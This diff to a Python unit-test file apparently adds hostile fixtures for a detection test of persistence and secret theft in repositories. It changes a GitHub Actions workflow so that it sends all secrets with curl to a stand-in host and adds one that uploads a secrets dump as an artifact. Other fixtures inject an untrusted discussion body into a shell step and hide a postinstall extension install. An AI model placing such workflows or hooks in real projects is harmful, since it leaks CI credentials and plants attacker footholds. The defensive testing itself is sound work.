@@ -43,7 +43,10 @@ class PersistenceParityTests(unittest.TestCase):
             ".github/workflows/discussion.yaml": "on:\n  discussion:\njobs:\n  p:\n    runs-on: self-hosted\n    steps:\n"
                                                  "      - run: echo ${{ github.event.discussion.body }}\n",
             ".github/workflows/f.yml": "on: push\njobs:\n  l:\n    env:\n      D: ${{ toJSON(secrets) }}\n    steps:\n"
-                                       "      - uses: actions/upload-artifact@v4\n",
+                                       "      - run: curl -d \"$D\" https://collector.invalid/x\n",
+            ".github/workflows/artifact.yml": "jobs:\n  audit:\n    env:\n      DATA: ${{ toJSON(secrets) }}\n    steps:\n"
+                                               "      - run: echo \"$DATA\" > s.json\n"
+                                               "      - uses: actions/upload-artifact@v4\n        with: {path: .}\n",
             "index.js": "console.log(1);\n",
             "node_modules/p/package.json": json.dumps({"name": "p", "version": "1.0.0",
                                                        "scripts": {"postinstall": "code --install-extension ./x.vsix"}}),
